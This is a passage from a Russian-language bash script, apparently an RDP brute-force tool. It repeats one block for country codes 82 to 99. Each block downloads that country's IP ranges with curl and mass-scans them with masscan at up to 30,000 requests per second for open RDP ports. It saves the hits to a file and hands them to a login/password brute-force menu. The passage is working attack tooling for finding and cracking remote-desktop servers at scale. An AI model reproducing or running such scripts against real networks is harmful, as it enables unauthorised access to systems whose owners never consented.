echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "82" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HUNGARY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Hungary://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "83" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ICELAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Iceland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "84" ]; then
curl http://services.ce3c.be/ciprg/?countrys=INDIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/India://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "85" ]; then
curl http://services.ce3c.be/ciprg/?countrys=INDONESIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Indonesia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "86" ]; then
curl http://services.ce3c.be/ciprg/?countrys=IRAN+%28ISLAMIC+REPUBLIC+OF%29%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Iran (ISLAMIC Republic Of)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "87" ]; then
curl http://services.ce3c.be/ciprg/?countrys=IRAQ |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Iraq://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "88" ]; then
curl http://services.ce3c.be/ciprg/?countrys=IRELAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ireland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "89" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ISRAEL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Israel://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "90" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ITALY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Italy://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "91" ]; then
curl http://services.ce3c.be/ciprg/?countrys=JAMAICA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Jamaica://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "92" ]; then
curl http://services.ce3c.be/ciprg/?countrys=JAPAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Japan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "93" ]; then
curl http://services.ce3c.be/ciprg/?countrys=JORDAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Jordan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "94" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KAZAKHSTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kazakhstan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "95" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KENYA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kenya://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "96" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KIRIBATI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kiribati://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "97" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KOREA+DEMOCRATIC+PEOPLE%27S+REPUBLIC+OF%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Korea Democratic People's Republic of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "98" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KUWAIT |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kuwait://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "99" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KYRGYZSTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kyrgyzstan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

